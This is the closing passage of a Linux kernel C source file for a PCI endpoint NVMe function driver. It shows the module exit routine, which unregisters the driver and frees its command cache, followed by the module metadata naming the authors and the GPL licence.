	pr_err("Register nvme EPF driver failed\n");

	return ret;
}
module_init(pci_epf_nvme_init);

static void __exit pci_epf_nvme_exit(void)
{
	pci_epf_unregister_driver(&epf_nvme_driver);

	kmem_cache_destroy(epf_nvme_cmd_cache);

	pr_info("Unregistered nvme EPF driver\n");
}
module_exit(pci_epf_nvme_exit);

MODULE_DESCRIPTION("PCI endpoint NVMe function driver");
MODULE_AUTHOR("Rick Wertenbroek <rick.wertenbroek@gmail.com>");
MODULE_AUTHOR("Damien Le Moal <dlemoal@kernel.org>");
MODULE_IMPORT_NS(NVME_TARGET_PASSTHRU);
MODULE_IMPORT_NS(NVME_FABRICS);
MODULE_LICENSE("GPL");
